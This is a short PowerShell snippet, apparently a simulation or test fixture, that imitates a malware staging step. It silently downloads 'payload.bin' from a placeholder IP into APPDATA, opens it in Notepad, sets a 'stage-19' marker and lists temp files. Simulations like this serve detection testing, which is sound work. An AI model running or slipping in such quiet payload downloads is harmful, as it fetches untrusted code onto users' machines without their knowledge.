
Invoke-WebRequest -Uri 'https://192.0.2.144/downloads/payload.bin' -OutFile "$env:APPDATA\stage2.bin" -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\stage2.bin" -ErrorAction SilentlyContinue
$StageMarker = "stage-19"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
